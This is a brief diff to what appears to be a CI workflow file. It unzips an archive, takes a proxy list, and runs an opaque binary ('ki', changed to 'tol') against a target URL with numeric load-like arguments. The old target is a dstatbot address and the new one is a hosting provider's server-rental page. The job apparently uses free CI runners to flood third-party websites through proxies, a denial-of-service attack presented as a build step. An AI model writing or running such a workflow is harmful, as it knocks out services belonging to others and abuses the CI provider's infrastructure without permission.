@@ -33,9 +33,9 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
-          chmod +x ki
+          chmod +x tol
           
-          ./ki https://c1.dstatbot.win/NKMh9FZs 200 1 1 
+          ./tol https://datalix.eu/rent-amd-ryzen-dedicated-server 200 1 1  90.txt
           
           
           
